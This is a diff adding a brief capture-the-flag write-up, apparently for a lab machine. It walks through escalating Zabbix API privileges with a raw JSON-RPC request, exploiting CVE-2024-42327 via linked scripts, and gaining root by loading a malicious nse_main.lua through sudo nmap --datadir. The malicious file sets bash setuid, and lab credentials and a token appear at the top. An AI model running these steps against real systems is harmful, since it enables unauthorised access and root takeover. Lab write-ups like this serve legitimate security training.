@@ -1,0 +1,43 @@
+starting creds:
+Zabbix: matthew / 96qzn0h2e1k3
+
+
+https://vuldb.com/?id.286239
+
+-------------update your group to admin group---------------
+
+POST /zabbix/api_jsonrpc.php HTTP/1.1
+Host: 10.10.11.50
+User-Agent: curl/8.11.1
+Accept: */*
+Content-Type: application/json-rpc
+Authorization: Bearer 6edf57b433d31f95432ca911b432c9ae
+Content-Length: 102
+Connection: keep-alive
+
+{"jsonrpc":"2.0","method":"user.update","params":
+{"userid":"3","usrgrps":[{"usrgrpid":"7"}]},"id":1}
+
+then exploit sqli cve: 
+https://github.com/compr00t/CVE-2024-42327/blob/main/cve-2024-42327.py
+https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE/blob/main/exploit.py
+
+to get admin session and then you can RCE with that
+
+the first github url sqli works fine and we get admin session but the second one with RCE doesnt work and needs a little fixing in getting admin session so we can merge the two
+
+after getting the shell and user flag, you immediately see that you can use nmap with sudo perms.
+
+GTFObins isnt useful since nmap has some options blocked so i looked for other options and saw --datadir that lets you customize the folder from which scripts are read and executed so asking chatgpt, i discovered that some default options execute certain scripts like:
+
+changing `nmap-mac-prefixes` and executing `sudo nmap -O 127.0.0.1`
+changing `nmap-services` and executing  `sudo nmap -p 9999 127.0.0.1`
+changing `nmap-payloads` and executing  `sudo nmap -p 135 127.0.0.1`
+changing `nse_main.lua`	and executing  `sudo nmap -sV 127.0.0.1`
+changing `nse_main.lua`	and executing  `sudo nmap -sV 127.0.0.1`
+
+so i created /tmp/nse_main.lua containing 'os.execute("chmod +s /bin/bash")' then execute: sudo /usr/bin/nmap --datadir=/tmp -sV -sC localhost
+
+and after its done you can just:
+
+/bin/bash -p
